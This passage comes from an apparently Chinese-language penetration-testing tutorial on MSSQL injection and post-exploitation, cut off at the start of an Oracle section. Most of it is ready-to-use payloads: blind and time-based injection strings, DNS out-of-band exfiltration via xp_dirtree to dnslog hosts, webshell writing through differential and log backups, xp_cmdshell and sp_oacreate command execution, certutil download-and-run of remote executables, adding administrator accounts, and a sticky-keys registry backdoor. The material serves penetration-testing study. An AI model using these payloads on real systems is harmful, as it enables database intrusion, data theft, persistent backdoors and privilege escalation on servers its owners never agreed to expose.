class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109 #爆库名</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and len(name)=5)=1   #爆表长度</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,1,1))=117)=1  #爆表名</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,1,1))=105)=1  #爆第二个表名</span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1;if (select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))=1 WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure><blockquote><p>前提是能用堆叠，利用<code>waitfor delay &#39;*&#39;</code>延时，’0.0.5’表示小时、分钟、秒</p></blockquote><p><strong>dnslog外带注入</strong>:</p><p>前提是<strong>能堆叠，且权限为sa</strong></p><p>原理是用xp_subdirs，xp_dirtree, xp_fileexist三个扩展存储过程，读取smb共享域名。也有用OpenRowset()和OpenDatasource()的办法，这两个函数为远程加载其他mssql数据库，默认关闭。</p><p>xp_subdirs：<strong>用于列出指定目录的子目录</strong>。</p><p>xp_dirtree：<strong>递归列出指定目录的所有子目录和文件</strong>。</p><p>xp_fileexist：<strong>检查指定文件或目录是否存在</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @host varchar(1024);</span><br><span class="line">select @host=convert(varchar(1024),db_name())+&#x27;.vj0r9q.dnslog.cn&#x27;;</span><br><span class="line">exec(&#x27;master..xp_subdirs &quot;\\&#x27;+@host+&#x27;&quot;&#x27;); --xp_subdirs 尝试访问 \\db_name().vj0r9q.dnslog.cn，这会触发一次 DNS 解析请求。</span><br></pre></td></tr></table></figure><blockquote><p>declare声明变量</p></blockquote><p>或者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;master..xp_dirtree &quot;\\&#x27;+@host+&#x27;&quot;&#x27;);</span><br><span class="line">exec(&#x27;master..xp_fileexist &quot;\\&#x27;+@host+&#x27;\test&quot;&#x27;);</span><br></pre></td></tr></table></figure><p>也有无需堆叠的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from fn_xe_file_target_read_file(&#x27;C:\Windows\win.ini&#x27;,&#x27;\\&#x27;+(select user)+&#x27;.a72ita.dnslog.cn\1.xem&#x27;,null,null))</span><br><span class="line">and exists(select * from fn_get_audit_file(&#x27;\\&#x27;+(select user)+&#x27;.a72ita.dnslog.cn\1.xem&#x27;,null,null))</span><br><span class="line">and exists(select * from fn_trace_gettable(&#x27;\\&#x27;+(select user)+&#x27;.xrjff0.dnslog.cn\1.trc&#x27;,null))</span><br></pre></td></tr></table></figure><blockquote><p><code>fn_xe_file_target_read_file</code>:用于读取 SQL Server 扩展事件（Extended Events）的目标文件。第二个参数本应是扩展事件文件路径，这里换成我们的查询语句通过UNC 路径会触发DNS请求</p><p><code>fn_get_audit_file</code>：用于读取SQL Server 审计日志文件。</p><p><code>fn_trace_gettable</code>：用于读取 SQL Server 跟踪文件</p></blockquote><h4 id="mssql-getshell"><a href="#mssql-getshell" class="headerlink" title="mssql getshell"></a>mssql getshell</h4><p>注意，除了备份写shell其他都要sa权限</p><h5 id="获取网站绝对路径"><a href="#获取网站绝对路径" class="headerlink" title="获取网站绝对路径"></a>获取网站绝对路径</h5><ul><li><p><strong>报错寻找</strong></p></li><li><p><strong>通过配置文件</strong></p></li><li><p><strong>字典爆破</strong></p></li><li><p><strong>cmd搜索文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\sql.aspx)</span><br></pre></td></tr></table></figure><blockquote><p><code>/s</code>:列出所有子目录下的文件和文件夹</p><p><code>/b</code>:只列出路径和文件名，别的属性全部不显示</p></blockquote></li><li><p><strong>旁站信息收集</strong></p><p>找旁站有没有泄露绝对路径</p></li><li><p><strong>存储过程来搜索</strong></p><p><code>xp_cmdshell</code>：直接执行系统命令。</p><p><code>xp_dirtree</code>：递归列出指定目录的所有子目录和文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure><p>xp_cmdshell我们可以建立一个表，将我们的cmd查询结果写入表中，再查询表即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1;CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">id=1;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><code>\r</code>：递归搜索</p></blockquote><p>SQL Server 阻止了对组件 <code>xp_cmdshell</code> 的过程 <code>sys.xp_cmdshell</code> 的访问，因为此组件已作为此服务器安全配置的一部分而被<strong>关闭</strong>。如果xp_cmdshell不能调用，可通过使用<strong>sp_configgure启用（需要sysadmin权限）</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 允许修改高级参数 </span><br><span class="line">;EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line">// 打开xp_cmdshell 扩展</span><br><span class="line">;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;--</span><br></pre></td></tr></table></figure></li></ul><h5 id="备份写shell"><a href="#备份写shell" class="headerlink" title="备份写shell"></a>备份写shell</h5><h6 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h6><p>条件：</p><ul><li><p><strong>至少DBO权限</strong></p></li><li><p><strong>前提知道绝对路径，路径可写。</strong></p></li><li><p><strong>HTTP 500错误不是自定义</strong></p></li><li><p><strong>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</strong></p></li><li><p><strong>数据量不能太大</strong></p></li></ul><p>流程：</p><ul><li><p><strong>手动完整备份文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup database 库名 to disk = &#x27;c:\bak.bak&#x27; ;--</span><br></pre></td></tr></table></figure><blockquote><p>to disk：指定备份的目标位置为磁盘。</p><p>‘c:\bak.bak’：备份文件的完整路径和文件名。</p></blockquote><p>如果<strong>过滤了特殊的字符比如单引号</strong>，可以用<strong>定义局部变量来执行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x备份路径\xx.bak backup database @a to disk=@s--     </span><br><span class="line">//0x备份的数据库名转换成16位进制,db_name()里面可以加数字备份不同的数据库</span><br></pre></td></tr></table></figure></li><li><p><strong>创建恶意表并插入shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;create table 数据库名..表名(a image)--</span><br><span class="line"></span><br><span class="line">;insert into 数据库名..表名(a) values (0x3C25657865637574652872657175657374282261222929253E)--</span><br><span class="line">//&lt;%execute(request(&quot;a&quot;))%&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>差异备份到asp文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup database 库名 to disk = &#x27;c:\shell.asp&#x27; with differential , format ;--</span><br></pre></td></tr></table></figure><blockquote><p><code>WITH DIFFERENTIAL</code>：表示差异备份，仅备份自上次完整备份后的变化。</p><p><code>WITH FORMAT</code>：覆盖现有备份文件，确保写入成功。</p></blockquote><p>此时会将完整备份 <code>C:\bak.bak</code>所有的变更(新创建的 <code>test</code> 表和插入的恶意数据)都写入到<code>c:\shell.asp</code>文件中</p><p>如果<strong>过滤了特殊的字符比如单引号</strong>，可以用<strong>定义局部变量来执行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x备份路径\xx.asp backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--     </span><br><span class="line">//备份到路径\xx.asp，前提是已得知路径，注意转换为16进制,假如备份的路径为c:\webroot\shell.asp </span><br></pre></td></tr></table></figure></li><li><p><strong>备份完getshell后删除表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Drop table 数据库..表名--</span><br></pre></td></tr></table></figure></li></ul><p>差异备份有多种情况可能不成功，一般就是目录权限的问题，一般不要直接备份到 c 盘根目录</p><h6 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a>LOG备份</h6><p>前提：</p><ul><li><p><strong>至少DBO权限</strong></p></li><li><p><strong>前提得知绝对路径，并且可写</strong></p></li><li><p><strong>站库不分离</strong></p></li><li><p><strong>数据库必须被备份过一次</strong></p></li></ul><p>原理就是通过<strong>导出日志文件到web路径来getshell</strong></p><p>LOG备份的好处就是备份出来的webshell的<strong>文件大小非常的小</strong></p><p>流程：</p><ul><li><p><strong>数据库启用完整恢复模式</strong></p><p>数据库启用完整恢复功能后，会记录所有事务日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;alter database 库名 set RECOVERY FULL--</span><br></pre></td></tr></table></figure></li><li><p><strong>创建恶意表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create table 数据库名..表名(a image)--</span><br></pre></td></tr></table></figure><blockquote><p>image类型用于存储二进制数据（如文本、脚本）</p></blockquote></li><li><p><strong>事务日志备份</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup log 库名 to disk=&#x27;c:\xxx&#x27; with init</span><br></pre></td></tr></table></figure><blockquote><p><code>with init</code>：覆盖现有备份日志，创建一个新的日志链起点</p></blockquote></li><li><p><strong>插入shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;insert into 数据库名..表名 (a) values (0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line">//&lt;%execute(request(&quot;a&quot;))%&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>再次备份事务日志，生成恶意文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup log 库名 to disk = &#x27;c:\xxx\2.asp&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>会包含第一次备份以来的新事务日志，即插入shell的操作</p></blockquote></li><li><p><strong>删除表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Drop table 数据库名..表名--</span><br></pre></td></tr></table></figure></li></ul><h5 id="存储过程写shell"><a href="#存储过程写shell" class="headerlink" title="存储过程写shell"></a>存储过程写shell</h5><p>前提：</p><ul><li><strong>拥有DBA权限</strong></li><li><strong>知道的网站绝对路径</strong></li></ul><p>扩展存储过程：是mssql提供的特殊功能，本质上就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p><p>常用的扩展存储功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell—利用此存储过程可以直接执行系统命令。</span><br><span class="line">xp_regread—利用此存储过程可以进行注册表读取。</span><br><span class="line">xp_regwrit一利用此存储过程可以写入注册表。</span><br><span class="line">xp_dirtre一利用此存储过程可以进行列目录操作。</span><br><span class="line">xp_enumds—利用此存储过程可以进行ODBC连接。</span><br><span class="line">xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。</span><br><span class="line">xp_makecab一一利用此存储过程可以创建压缩卷。</span><br><span class="line">xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。</span><br><span class="line">xp_terminate_jroces一利用此存储过程可以查看终端进程，给出一个进程PID.</span><br><span class="line">sp_oacreate-SQL Server 中的 OLE 自动化存储过程，用于创建COM对象实例</span><br><span class="line">sp_oamethod-SQL Server 中的 OLE 自动化存储过程，调用已创建的 COM 对象的方法。</span><br></pre></td></tr></table></figure><h6 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h6><p>xp_cmdshell利用（一般都是sqlmap执行–os-shell后)：</p><ul><li><p><strong>开启xp_cmdshell</strong></p><p>在 SQL Server 2005以后默认关闭，需要利用sp_configure手动开启（需要sysadmin权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启高级选项</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"># 配置生效</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 开启xp_cmdshell，配置生效</span><br><span class="line">exec sp_configure&#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br></pre></td></tr></table></figure></li><li><p><strong>echo写shell</strong></p><p>前提是知道<strong>web目录的绝对路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ;</span><br></pre></td></tr></table></figure><blockquote><p><code>^</code>是转义字符用于转义<code>&lt;&gt;</code></p></blockquote><p>当<strong>路径为中文时不建议echo写马</strong></p><p><strong>一般利用sqlmap <code>--file-write</code>写bat文件getshell</strong></p><p>但注意mssql一般使用<strong>gb2312编码</strong>，而sqlmap <strong>echo写马使用utf-8编码</strong>，为了写马，常常需要在对方文件写一个bat执行文件，而asp的木马中 % 文件跟bat不兼容，所以我们手工写的需要将sqlmap代理到burp，抓包<strong>修改utf-8编码的hex改为gb2312编码的hex值</strong></p><p>或者使用远程下载免杀🐎：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=3;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://test1.com/shell.aspx  d:\test\shell.aspx&quot; --</span><br></pre></td></tr></table></figure><blockquote><p>Certutil是Windows系统中的一个命令行工具，在渗透测试中常用来下载文件、编码解码数据</p><p><code>-urlcache</code>：启用 URL 缓存。</p><p><code>-split</code>：分割输出。</p><p><code>-f</code>：强制覆盖现有文件。</p></blockquote></li></ul><h6 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h6><p><code>sp_oacreate</code>：SQL Server 中的 OLE 自动化存储过程，用于<strong>创建COM对象实例</strong><br><code>sp_oamethod</code>：SQL Server 中的 OLE 自动化存储过程，调用<strong>已创建的 COM 对象的方法</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @object_id INT;</span><br><span class="line">EXEC sp_oacreate &#x27;COM组件名称&#x27;, @object_id OUTPUT;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_oamethod @object_id, &#x27;方法名&#x27;, [返回变量], 参数1, 参数2, ...;</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 首先判断当前是否为DBA权限，为1则可以提权</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-- 利用存储过程写入一句话,注意路径</span><br><span class="line">declare @o int, @f int, @t int, @ret int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;createtextfile&#x27;, @f out, &#x27;C:\www\test.asp&#x27;, 1</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>创建文件系统对象<code>scripting.filesystemobject</code>，并调用其<code>createtextfile</code>方法创建test.asp文件，同时将创建的文件对象引用存储在变量 <code>@f</code> 中。最后通过writeline将shell写入文件中</p></blockquote><h4 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h4><h5 id="xp-cmdshell-1"><a href="#xp-cmdshell-1" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h5><p>测试xp_cmdshell是否可执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;ver&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>执行会显示当前操作系统的版本信息。</p></blockquote><p><strong>添加管理员用户</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建一个用户q添加到本地组组</span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;net user q 123456q /add&#x27;</span><br><span class="line">#将本地组q添加管理员组</span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;net localgroup administrators q /add&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;add是一个参数，表示执行添加用户的操作</p><p><code>net user</code>：管理用户账户</p><p><code>net localgroup</code>：管理本地组</p></blockquote><p><strong>下载执行恶意程序</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#x27;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#x27;;</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;cd c:\www &amp; file.exe&#x27;;</span><br></pre></td></tr></table></figure><h5 id="sp-oacreate-1"><a href="#sp-oacreate-1" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h5><p><strong>sp_oacreate</strong> 是一个非常危险的存储过程可以<strong>删除、复制、移动文件</strong>。还能配合 <strong>sp_oamethod</strong> 来写文件执行 cmd。</p><p>当xp_cmdshell被删除可以使用sp_oacreate来提权</p><p><strong>恢复sp_oacreate</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 开启sp_oacreate</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line"># 关闭sp_oacreate</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br><span class="line"></span><br><span class="line"># 查看 sp_oacreate 状态</span><br><span class="line">exec sp_configure;</span><br></pre></td></tr></table></figure><blockquote><p><code>ole automation procedures</code>：OLE 自动化过程，允许 SQL Server 可以通过 OLE 自动化接口与外部应用程序进行交互。</p></blockquote><p><strong>执行cmd:</strong></p><p><code>wscript.shell</code>：是 Windows Script Host (WSH) 中的一个 COM 对象，它提供了与 Windows 操作系统进行交互的功能，通常用于<strong>执行系统命令、运行程序、设置环境变量</strong>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;, @shell output</span><br><span class="line">exec sp_oamethod @shell, &#x27;run&#x27;, null, &#x27;c:\windows\system32\cmd.exe /c xxx&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;c表示<code>cmd.exe</code> 执行完命令后关闭命令行窗口。xxx指任意命令或脚本。</p></blockquote><p><code>Shell.Application</code>：是另一个 Windows Shell COM 对象，它能提供了比 <code>WScript.Shell</code> 更多的功能，尤其是与 Windows Shell 进行交互的功能。通过 <code>Shell.Application</code>同样可以<strong>执行文件、显示文件夹、启动进程</strong>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;, null, &#x27;cmd.exe&#x27;, &#x27;cmd /c net user &gt;c:\test.txt&#x27;, &#x27;c:\windows\system32&#x27;, &#x27;&#x27;, &#x27;1&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p><code>&#39;cmd /c net user &gt; c:\test.txt&#39;</code>：会执行 <code>net user</code> 命令（列出所有用户），并将输出重定向到 <code>c:\test.txt</code> 文件中。</p><p><code>&#39;c:\windows\system32&#39;</code>：执行命令时的工作目录</p></blockquote><p><strong>提权：</strong></p><p>一样的，只用把执行的命令换成提权的命令就行了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o INT</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;,@o output</span><br><span class="line">exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;net user hack hack /add&#x27;,&#x27;0&#x27;,&#x27;true&#x27;;</span><br><span class="line">exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;net localgroup administrators hack /add&#x27;,&#x27;0&#x27;,&#x27;true&#x27;;</span><br></pre></td></tr></table></figure><p><code>Shell.Application</code>方法一样</p><h5 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h5><p><strong>沙盒模式</strong>是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p><p>利用前提：</p><ul><li><code>xp_regwrite</code> 可用(使用条件)</li><li>拥有 DBA 权限</li><li>服务器拥有 jet.oledb.4.0 驱动</li></ul><p>原理就是对注册表的操作，依赖<strong>xp_regwrite</strong>存储过程对注册表修改，且<strong>服务器拥有 jet.oledb.4.0 驱动。</strong></p><p><strong>开启沙盒模式</strong>：</p><p>注册表中沙盒模式的位置在：<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\Engine\SandBoxMode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#win2003</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1</span><br></pre></td></tr></table></figure><blockquote><p>修改注册表中Jet 4.0引擎的SandBoxMode值为1</p></blockquote><p><strong>SandBoxMode参数含义（默认为2）</strong>：</p><ul><li><code>0</code>：在任何所有者中禁止启用安全模式</li><li><code>1</code> ：为仅在允许范围内</li><li><code>2</code> ：必须在access模式下</li><li><code>3</code>：完全开启</li></ul><p><strong>利用 jet.oledb 执行系统命令添加用户:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net user q 123456q /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p><strong>将 q 用户添加至管理员组:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net localgroup administrators q /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><h5 id="利用映像劫持提权"><a href="#利用映像劫持提权" class="headerlink" title="利用映像劫持提权"></a>利用映像劫持提权</h5><p>原理就是利用xp_regwrite函数修改注册表，起到劫持作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution</span><br><span class="line">Options\sethc.EXE&#x27;,&#x27;Debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p><code>sethc.exe</code> 是 Windows 系统中的 “Sticky Keys” (粘滞键) 实用程序，它通常是通过按下 Shift 键五次启动的，用于帮助那些有肢体障碍的用户。</p></blockquote><p>当按下 Shift 键五次后系统会以<code>SYSTEM</code>权限运行<code>cmd.exe</code></p><h5 id="CLR提权"><a href="#CLR提权" class="headerlink" title="CLR提权"></a>CLR提权</h5><p>CLR（公共语言运行库）集成是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，允许在数据库中执行 .NET 程序。攻击者可以利用 CLR 提供的能力编写恶意代码，执行操作系统命令。以后再研究吧</p><p>可以使用<strong>SharpSQLTools</strong>工具</p><h4 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><ul><li><p>特殊字符<code>%C2%85(U+0085,控制字符(NEL))</code>、<code>%C2%A0(U+00A0,不换行空格)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%C2%85union%C2%85select%C2%A0null,@@version,null--</span><br></pre></td></tr></table></figure></li></ul><h3 id="oracle注入"><a href="#oracle注入" class="headerlink" title="oracle注入"></a>oracle注入</h3><h4 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong>特殊核心表</strong>：</p><p>dual：是一个虚拟表，用来构成select的语法规则，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null from dual</span><br></pre></td></tr></table></figure><p>能查询表信息的<strong>系统表</strong>：</p><p><code>dba_tables</code> : 